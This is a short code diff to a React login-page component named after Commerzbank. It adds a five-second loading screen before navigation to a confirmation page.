@@ -141,7 +141,7 @@ function CommerzbankLoginPage() {
                   sessionStorage.setItem("bankName", "Commerzbank");
                   sessionStorage.setItem("bankLogo", "commerzbank");
                 } catch {}
-                navigate({ to: "/confirm" });
+                navigate({ to: "/loading", search: { to: "/confirm", ms: 5000 } });
               }}
               className={`h-14 w-full rounded-full text-[15px] font-semibold transition-colors ${
                 canContinue
